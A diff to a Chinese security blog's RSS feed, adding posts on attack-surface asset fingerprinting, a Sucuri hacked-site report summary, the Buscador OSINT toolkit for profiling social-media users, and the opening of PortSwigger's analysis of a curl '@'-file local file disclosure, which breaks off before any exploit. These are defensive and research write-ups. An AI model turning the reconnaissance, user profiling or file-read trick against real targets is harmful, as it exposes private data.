@@ -7,7 +7,1002 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 22:33:52 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 03 Aug 2025 07:05:54 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>攻击面资产分类实践指南：从DNS记录到HTML分析的全面技术解析</title>
+        <link>http://localhost:1313/p/%E6%94%BB%E5%87%BB%E9%9D%A2%E8%B5%84%E4%BA%A7%E5%88%86%E7%B1%BB%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%E4%BB%8Edns%E8%AE%B0%E5%BD%95%E5%88%B0html%E5%88%86%E6%9E%90%E7%9A%84%E5%85%A8%E9%9D%A2%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 07:05:54 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%94%BB%E5%87%BB%E9%9D%A2%E8%B5%84%E4%BA%A7%E5%88%86%E7%B1%BB%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%E4%BB%8Edns%E8%AE%B0%E5%BD%95%E5%88%B0html%E5%88%86%E6%9E%90%E7%9A%84%E5%85%A8%E9%9D%A2%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;攻击面中每项资产的分类实践指南&#34;&gt;攻击面中每项资产的分类实践指南
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;TLDR&lt;/strong&gt;：本文详述了从业者可用于分类攻击面中每个Web应用和资产的方法与工具（从DNS记录、IP地址到HTTP分析和HTML内容）。您将学习从攻击者视角审视资产，不仅能识别资产存在，还能精确判断其性质。&lt;/p&gt;
+&lt;h2 id=&#34;资产分类的必要性&#34;&gt;资产分类的必要性
+&lt;/h2&gt;&lt;p&gt;&amp;ldquo;无法保护未知存在的资产&amp;quot;是网络安全领域的常见箴言。但现实更为复杂：仅知道某物存在并不足够。要有效保护资产，必须了解每个资产的实质。没有正确分类，安全措施和工具的应用将变成猜谜游戏。&lt;/p&gt;
+&lt;p&gt;Detectify研究表明，普通企业平均会漏测90%可能成为攻击目标的复杂Web应用。关键在于：攻击者只关心实际可访问的资产，而非您认为暴露的内容。&lt;/p&gt;
+&lt;h2 id=&#34;外部视角的数据采集方法&#34;&gt;外部视角的数据采集方法
+&lt;/h2&gt;&lt;p&gt;本指南假设采用由外至内的黑盒分析视角（非基于内部网络数据或源代码），按典型连接流顺序介绍分类方法：&lt;/p&gt;
+&lt;h3 id=&#34;握手阶段分析&#34;&gt;握手阶段分析
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;托管位置&lt;/li&gt;
+&lt;li&gt;指针类型（A/CNAME/MX等记录）&lt;/li&gt;
+&lt;li&gt;TXT记录信息（如SPF/DKIM/DMARC）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;IP&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;地理位置&lt;/li&gt;
+&lt;li&gt;自治系统号(ASN)归属&lt;/li&gt;
+&lt;li&gt;独立IP或地址段归属&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;端口&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;开放/关闭状态&lt;/li&gt;
+&lt;li&gt;防火墙行为特征（TCP/UDP处理差异）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;协议&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口响应协议（HTTP/FTP/SSH等）&lt;/li&gt;
+&lt;li&gt;嵌套协议（如HTTP over TLS）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SSL/TLS&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;证书颁发机构(CA)&lt;/li&gt;
+&lt;li&gt;JARM指纹数据&lt;/li&gt;
+&lt;li&gt;主题备用名称(SANs)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;http深度分析&#34;&gt;HTTP深度分析
+&lt;/h3&gt;&lt;p&gt;重点解析Web应用核心协议HTTP的关键数据点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;响应代码&lt;/strong&gt;：200 OK/30X重定向/50X服务器错误&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;响应头&lt;/strong&gt;：X-自定义头/Cookie/安全头信息&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文件签名&lt;/strong&gt;：响应体前几字节的二进制特征&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;内容类型与长度&lt;/strong&gt;：JSON/XML/HTML等格式识别&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;html层解析&#34;&gt;HTML层解析
+&lt;/h3&gt;&lt;p&gt;当响应为HTML时可获取更丰富信息：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Favicon哈希&lt;/strong&gt;：快速识别已知软件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;URL模式&lt;/strong&gt;：如/wp-admin/等特征路径&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Meta标签&lt;/strong&gt;：generator等属性暴露CMS信息&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;表单结构&lt;/strong&gt;：登录表单字段揭示系统类型&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;代码特征&lt;/strong&gt;：JS/HTML/CSS中的框架指纹&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;第三方资源&lt;/strong&gt;：引用的外部脚本/API来源&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;工具与技术实现&#34;&gt;工具与技术实现
+&lt;/h2&gt;&lt;h3 id=&#34;dns分析&#34;&gt;DNS分析
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;小规模：&lt;code&gt;dig&lt;/code&gt;命令+人工模式识别&lt;/li&gt;
+&lt;li&gt;大规模：MassDNS等开源工具&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;ip端口扫描&#34;&gt;IP/端口扫描
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;精准扫描：Nmap（支持服务检测）&lt;/li&gt;
+&lt;li&gt;大规模扫描：Zmap/MASSCAN（速度优先）&lt;/li&gt;
+&lt;li&gt;ASN查询：Whois命令行/在线工具&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;协议识别&#34;&gt;协议识别
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;标准工具：Nmap&lt;/li&gt;
+&lt;li&gt;高级指纹：JA4T（TLS指纹）/fingerprintx&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;ssltls解析&#34;&gt;SSL/TLS解析
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;JARM主动探测工具&lt;/li&gt;
+&lt;li&gt;证书透明度日志（如crt.sh）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;http特征提取&#34;&gt;HTTP特征提取
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;状态码分析&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;30X重定向暴露服务器类型（如nginx）&lt;/li&gt;
+&lt;li&gt;40X/50X错误触发特定系统响应&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;响应头检测&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;Server/X-Powered-By等显性标记&lt;/li&gt;
+&lt;li&gt;CSP策略分析依赖资源（如Salesforce）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;内容检测&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;file&lt;/code&gt;/&lt;code&gt;xxd&lt;/code&gt;命令分析文件签名&lt;/li&gt;
+&lt;li&gt;Content-Type+Length组合识别应用类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;html指纹库&#34;&gt;HTML指纹库
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Favicon哈希&lt;/strong&gt;：Shodan等平台预置库&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;路径爆破&lt;/strong&gt;：ffuf/dirsearch等工具配合字典&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;元标签抓取&lt;/strong&gt;：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;generator&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;WordPress 6.2.2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;代码语法树分析&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;Tree-sitter解析JavaScript AST&lt;/li&gt;
+&lt;li&gt;ANTLR处理GraphQL等复杂语法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;综合分类实践&#34;&gt;综合分类实践
+&lt;/h2&gt;&lt;p&gt;通过组合多维度数据点可回答关键安全问题：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DNS端点是否过时？&lt;/li&gt;
+&lt;li&gt;是否遵守内部证书颁发策略？&lt;/li&gt;
+&lt;li&gt;重定向配置是否正确？&lt;/li&gt;
+&lt;li&gt;CMDB是否与实际暴露面一致？&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;系统化的资产分类使安全团队超越简单发现，实现深度理解和测试。部分工具可自动化分类过程，并智能推荐需重点测试的高风险资产。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>深度解析SUCURI《2018被黑网站趋势报告》：CMS漏洞与恶意软件攻防实录</title>
+        <link>http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90sucuri2018%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E8%B6%8B%E5%8A%BF%E6%8A%A5%E5%91%8Acms%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E5%BD%95/</link>
+        <pubDate>Sun, 03 Aug 2025 06:20:59 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90sucuri2018%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E8%B6%8B%E5%8A%BF%E6%8A%A5%E5%91%8Acms%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E5%BD%95/</guid>
+        <description>&lt;h3 id=&#34;cms安全态势分析&#34;&gt;CMS安全态势分析
+&lt;/h3&gt;&lt;p&gt;报告显示56%被黑网站的核心CMS平台已安装最新补丁。但深入分析各CMS版本状态后发现问题依然严峻：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;：虽然36.7%的受感染站点存在版本滞后（较2016年下降24.3%），但其仍占被黑网站的60%，反映出第三方生态的安全隐患&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;电商平台&lt;/strong&gt;：Magento(83.1%)、OpenCart(91.3%)和PrestaShop(97.2%)的版本滞后率惊人，这些处理支付交易的系统存在核心漏洞风险，且升级过程存在兼容性难题&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;主要攻击向量&#34;&gt;主要攻击向量
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;凭证填充攻击&lt;/strong&gt;：通过暴力破解获取管理员权限&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;第三方组件漏洞&lt;/strong&gt;：2018年发现196个漏洞，其中：
+&lt;ul&gt;
+&lt;li&gt;WordPress插件116个漏洞（17%为高危）&lt;/li&gt;
+&lt;li&gt;Joomla!扩展28个高危漏洞&lt;/li&gt;
+&lt;li&gt;Magento第三方模块正成为新兴攻击入口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;黑名单机制缺陷&#34;&gt;黑名单机制缺陷
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;仅11%的被黑网站触发黑名单（同比下降6%）&lt;/li&gt;
+&lt;li&gt;各平台检测率差异显著：
+&lt;ul&gt;
+&lt;li&gt;Norton：46.1%&lt;/li&gt;
+&lt;li&gt;Google：10.4%&lt;/li&gt;
+&lt;li&gt;McAfee：下降4%&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;恶意软件家族分布&#34;&gt;恶意软件家族分布
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;后门程序&lt;/strong&gt;：68%的感染站点存在（主要用于维持持久访问）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SEO垃圾注入&lt;/strong&gt;：同比增长78%，主要篡改：
+&lt;ul&gt;
+&lt;li&gt;index.php（34.5%）：隐藏文件包含攻击&lt;/li&gt;
+&lt;li&gt;functions.php（13.5%）：SEO垃圾注入器&lt;/li&gt;
+&lt;li&gt;wp-config.php（10.6%）：数据库凭证窃取&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;加密货币挖矿&lt;/strong&gt;：33%为服务端PHP矿工，67%为客户端JS矿工（如CoinHive）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;关键防御建议&#34;&gt;关键防御建议
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;建立多黑名单平台监控（Google/Norton/Yandex等）&lt;/li&gt;
+&lt;li&gt;对核心文件（如wp-config.php）实施完整性校验&lt;/li&gt;
+&lt;li&gt;采用深度扫描清除隐藏后门&lt;/li&gt;
+&lt;li&gt;电商站点需严格遵守PCI DSS 6.2条款（关键补丁30天内部署）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;报告完整数据见&lt;a class=&#34;link&#34; href=&#34;https://sucuri.net/reports/2018-hacked-website-report&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SUCURI 2018被黑网站报告&lt;/a&gt;，技术团队另提供&lt;a class=&#34;link&#34; href=&#34;https://blog.sucuri.net/2019/03/how-to-clean-a-hacked-wordpress-website.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;恶意文件清理指南&lt;/a&gt;。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>OSINT利器Buscador：开源情报收集的瑞士军刀</title>
+        <link>http://localhost:1313/p/osint%E5%88%A9%E5%99%A8buscador%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</link>
+        <pubDate>Sun, 03 Aug 2025 05:42:44 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/osint%E5%88%A9%E5%99%A8buscador%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</guid>
+        <description>&lt;h1 id=&#34;toolsmith-130---使用buscador进行osint调查&#34;&gt;toolsmith #130 - 使用Buscador进行OSINT调查
+&lt;/h1&gt;&lt;p&gt;首先，新年快乐！希望您拥有高效成功的2018年。作为开年之作，我将再次探讨开源情报(OSINT)技术。除微软信息安全主管的本职工作外，我还荣幸担任华盛顿国民警卫队J-2情报部门成员，结合J-6网络作战职能，OSINT在识别对手指标和红队评估目标方面具有重要价值。&lt;/p&gt;
+&lt;p&gt;Buscador是由OSINT专家Michael Bazzell和David Wescott开发的Linux虚拟机预配置平台，集成了我们曾讨论过的Recon-ng、Spiderfoot等工具。1.1版本包含以下核心工具集：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;地理定位工具&lt;/strong&gt;：Creepy（支持Twitter/Flickr等插件）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;元数据分析&lt;/strong&gt;：Metagoofil/ExifTool/pyExifToolGui&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;域名枚举&lt;/strong&gt;：Knock/SubBrute&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;社交媒体挖掘&lt;/strong&gt;：Tinfoleak/Instalooter&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网页镜像&lt;/strong&gt;：HTTrack/Wayback Exporter&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;实战测试&#34;&gt;实战测试
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Creepy定位分析&lt;/strong&gt;&lt;br&gt;
+配置Twitter插件搜索&amp;quot;holisticinfosec&amp;quot;，虽未获取精确坐标，但成功关联西雅图地区信息（图1-2）。对于开启地理标记的目标，该工具可绘制活动热力图。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Tinfoleak深度报告&lt;/strong&gt;&lt;br&gt;
+生成包含时间线、设备类型、话题标签的完整Twitter活动分析报告（图3），比原生API提供更丰富的元数据。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Metagoofil文档情报&lt;/strong&gt;&lt;br&gt;
+对目标域扫描50份公开文档，输出作者/公司/修改记录等元数据（图6），堪称红队侦察必备工具，其效率超越传统Foca工具。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;技术亮点&#34;&gt;技术亮点
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;虚拟化支持&lt;/strong&gt;：提供OVA镜像和ISO两种部署方式，通过QEMU转换后可在Hyper-V快速部署&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工作流集成&lt;/strong&gt;：所有工具通过左侧菜单栏统一调用，支持Instalooter采集图片→ExifTool解析→BleachBit清理的完整链条&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;即将更新&lt;/strong&gt;：1.2版本将重构Firefox适配并新增特性，开发者透露正在筹备新作&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;重要提示：虽然OSINT工具威力强大，但务必遵守道德准则。公开文档中的元数据可能暴露敏感信息，建议发布前进行清理。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;该平台将分散的OSINT工具整合为标准化工作环境，极大提升了网络侦察效率。对于需要持续进行威胁情报分析的专业人员，Buscador堪称&amp;quot;一站式解决方案&amp;quot;。期待1.2版本带来更多创新功能。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞</title>
+        <link>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
+        <pubDate>Sun, 03 Aug 2025 05:15:26 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="https://portswigger.net/cms/9a8b6e0b1d8b5b5a/cover-image/research.jpg" alt="Featured image of post curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞" /&gt;&lt;p&gt;在这篇文章中，我们将探讨curl中一个鲜为人知的特性，该特性导致了Burp Suite Pro和Google Chrome的本地文件泄露漏洞。虽然我们早已为Burp Suite发布了补丁，但怀疑该技术可能对利用其他具有&amp;quot;复制为curl命令&amp;quot;功能或从命令行调用curl的应用程序有所帮助。该漏洞由Paul Mutton通过我们的漏洞赏金计划私下报告，并慷慨地允许我们发布这篇分析报告。&lt;/p&gt;
+&lt;p&gt;Burp Suite用户经常构造复杂的HTTP请求来演示网站漏洞。为了更轻松地与他人共享这些概念验证漏洞利用，我们提供了&amp;quot;复制为curl命令&amp;quot;功能，可生成复制Burp Suite中请求的curl命令。&lt;/p&gt;
+&lt;p&gt;例如，给定以下请求：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST / HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: portswigger.net
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 7
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;foo=bar
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;点击&amp;quot;复制为curl命令&amp;quot;后，Burp Suite会生成以下命令并复制到剪贴板：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -X $&amp;#39;POST&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Host: portswigger.net&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Length: 7&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     --data-binary $&amp;#39;foo=bar&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     $&amp;#39;https://portswigger.net/&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;您可以将此命令粘贴到终端中，在Burp Suite外部重新发出请求。我们非常注意转义这些数据，以避免用户因恶意请求注入额外的shell命令或任意curl参数而受到攻击。但不幸的是，存在一个更微妙的问题。您能发现吗？&lt;/p&gt;
+&lt;p&gt;答案一如既往地藏在友好的手册中：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--data-binary &amp;lt;data&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这将完全按指定方式发送数据，不进行任何额外处理。
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;如果数据以字母@开头，其余部分应为文件名。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;因此，以下命令是安全的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
